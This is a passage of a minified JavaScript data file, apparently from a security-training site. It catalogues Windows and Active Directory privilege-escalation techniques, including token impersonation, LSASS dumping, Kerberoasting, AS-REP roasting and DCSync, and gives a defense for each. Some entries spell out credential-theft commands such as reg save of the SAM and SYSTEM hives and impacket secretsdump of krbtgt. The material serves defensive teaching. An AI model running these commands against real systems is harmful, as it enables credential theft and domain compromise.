-E 'CapEff|NoNewPrivs' /proc/self/status",defense:"Use Rootless Docker/Podman, never mount `/var/run/docker.sock` into untrusted containers, and enforce `no-new-privileges:true`."}]},{id:"windows-privesc",label:"🪟 Windows Internals & PrivEsc",subtitle:"Access Tokens (`SeImpersonate`), LSASS, Unquoted Service Paths, Service ACLs & Registry",items:[{vector:"Token Privileges (`SeImpersonatePrivilege` / `SeAssignPrimaryToken`)",mechanism:"Service accounts (`IIS apppool`, `MSSQL`, `Network Service`) hold `SeImpersonatePrivilege` by default. Attackers use Potato primitives (PrintSpoofer, GodPotato, JuicyPotatoNG) to coerce `NT AUTHORITY\\SYSTEM` to authenticate to a rogue named pipe and impersonate its primary token.",enumCli:"whoami /priv && whoami /groups",defense:"Isolate service accounts into Group Managed Service Accounts (gMSAs) with minimal privileges and monitor named-pipe creation (Sysmon Event ID 17/18)."},{vector:"LSASS Memory Credential Dumping (`SeDebugPrivilege`)",mechanism:"Local Administrators hold `SeDebugPrivilege`, allowing processes like Mimikatz (`sekurlsa::logonpasswords`), `procdump.exe -ma lsass.exe`, or `comsvcs.dll MiniDump` to read NTLM hashes and Kerberos tickets from `lsass.exe` virtual memory.",enumCli:"tasklist /svc | findstr lsass && reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL",defense:"Enable LSA Protection (`RunAsPPL=1`), Windows Defender Credential Guard (VBS), and alert on Sysmon Event ID 10 (`TargetImage: lsass.exe`, `GrantedAccess: 0x1010` / `0x1FFFFF`)."},{vector:"Unquoted Service Paths & Weak Service Binary ACLs",mechanism:"If a SYSTEM service has an unquoted path containing spaces (`C:\\Program Files\\Custom App\\Service.exe`) without quotes, the Windows Service Control Manager (SCM) sequentially attempts to execute `C:\\Program.exe` and `C:\\Program Files\\Custom.exe` as `SYSTEM`.",enumCli:'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\" | findstr /i /v """"',defense:"Wrap all service `ImagePath` registry values in quotes and verify `BUILTIN\\Users` lacks `(F)` or `(M)` permissions via `icacls`."},{vector:"SAM / SYSTEM Registry Hives & Volume Shadow Copies",mechanism:"Backup operators (`SeBackupPrivilege`) or attackers finding leftover `C:\\Windows\\Repair\\SAM` or VSS snapshots can extract the `SAM` and `SYSTEM` hives offline to dump local NTLM password hashes with Impacket `secretsdump.py`.",enumCli:"reg save HKLM\\SAM sam.bak && reg save HKLM\\SYSTEM sys.bak",defense:"Restrict `SeBackupPrivilege`, audit Registry hive exports (Event ID 4688 `reg.exe save`), and enforce LAPS (Windows Local Administrator Password Solution)."}]},{id:"ad-escalation",label:"🏰 Active Directory & Kerberos",subtitle:"Kerberoasting, AS-REP Roasting, BloodHound ACLs, AD CS (`ESC1-8`), RBCD & DCSync",items:[{vector:"Kerberoasting (Service Principal Name TGS Cracking)",mechanism:"Any authenticated domain user can request a Kerberos TGS service ticket (`TGS-REQ`) for any account with a registered `servicePrincipalName` (SPN). Because the ticket is encrypted with the service account's NTLM/AES hash, attackers crack it offline at 10+ GH/s with Hashcat (`-m 13100`).",enumCli:"impacket-GetUserSPNs corp.local/jdoe -request -dc-ip 10.10.10.5 -outputfile tgs_hashes.txt",defense:"Migrate service accounts to gMSAs (120-character auto-rotating random passwords), disable RC4_HMAC (`0x17`) in favor of AES-256 (`0x12`), and monitor Event ID 4769 (`TicketEncryptionType: 0x17`)."},{vector:"AS-REP Roasting (`DONT_REQ_PREAUTH`)",mechanism:"If an AD user account has 'Do not require Kerberos preauthentication' (`UF_DONT_REQUIRE_PREAUTH`) enabled, anyone can send an `AS-REQ` without a password and receive an `AS-REP` chunk encrypted with the user's password hash (`Hashcat -m 18200`).",enumCli:"impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat -dc-ip 10.10.10.5",defense:"Enforce Kerberos Pre-Authentication on 100% of domain accounts and alert on Event ID 4768 with pre-auth type `0`."},{vector:"BloodHound DACL Abuse (`GenericAll`, `WriteDacl`, Shadow Credentials)",mechanism:"Over-permissive Active Directory Object ACLs allow lower-tier accounts to take over Domain Admins: `GenericWrite` enables adding a rogue `msDS-KeyCredentialLink` (Whisker / PKINIT Shadow Credentials), while `WriteDacl` lets an attacker grant themselves DCSync rights.",enumCli:"bloodhound-python -u jdoe -p 'Pass123!' -d corp.local -ns 10.10.10.5 -c All",defense:"Audit Tier-0 object ACLs continuously with BloodHound CE, enable `AdminSDHolder` protection, and place privileged accounts in the `Protected Users` security group."},{vector:"DCSync (`DS-Replication-Get-Changes-All`) & Golden Ticket",mechanism:"Attackers compromising an account with Domain Controller replication permissions simulate a DC over MS-DRSR (`drsuapi`) to pull the `krbtgt` NTLM/AES keys, enabling forged Golden Tickets valid for 10 years.",enumCli:"impacket-secretsdump corp.local/admin@10.10.10.5 -just-dc-user krbtgt",defense:"Alert immediately on Event ID 4662 for GUID `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` from any IP that is not an authorized Domain Controller, and rotate `krbtgt` twice during incident recovery."}]}];export{a as C,e as H,n as L,o as O,t as R,r as S,i as V};
